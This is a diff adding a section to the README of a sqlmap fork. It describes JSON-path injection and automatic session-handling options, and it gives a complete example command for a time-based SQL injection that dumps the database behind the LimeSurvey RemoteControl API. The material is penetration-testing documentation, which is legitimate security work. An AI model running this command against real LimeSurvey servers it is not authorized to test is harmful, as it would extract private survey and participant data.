@@ -36,6 +36,32 @@ To get a list of all options and switches use:
 You can find a sample run [here](https://asciinema.org/a/46601).
 To get an overview of sqlmap capabilities, a list of supported features, and a description of all options and switches, along with examples, you are advised to consult the [user's manual](https://github.com/sqlmapproject/sqlmap/wiki/Usage).
 
+JSON Enhancements (PoC)
+----
+
+This fork includes advanced support for JSON-based requests and nested parameters, optimized for modern APIs like JSON-RPC.
+
+### New Features
+* **JSON Path Injection**: Specify injection points using JSONPath syntax (e.g., `--json-path="$.params[2][0]"`).
+* **Automated Session Management**: Automatically handle authentication flows and token refreshing (e.g., `--auth-url`, `--auth-key-path`).
+* **Boolean-Based JSON Observer**: Custom indicators for True/False responses in JSON (e.g., `--true-json="$.result len 0"`).
+* **Adaptive Sleep Delay**: Reduced false positives in time-based injections via `--adaptive-sleep`.
+* **PoC Reporting**: Generate detailed, reproducible PoC reports using `--poc-report`.
+
+### Target Use Case: LimeSurvey RemoteControl API
+Example command for injecting into the LimeSurvey RemoteControl API:
+
+```bash
+python sqlmap.py -u "https://target/index.php/admin/remotecontrol" \
+  --method=POST \
+  --data='{"method":"mail_registered_participants","params":["SESSION",883455,["*"]],"id":1}' \
+  --json-path='$.params[2][0]' \
+  --auth-url="https://target/index.php/admin/remotecontrol" \
+  --auth-data='{"method":"get_session_key","params":["user","pass"],"id":1}' \
+  --auth-key-path='$.result' \
+  --batch --technique=T --dbms=mariadb --dump
+```
+
 Links
 ----
 
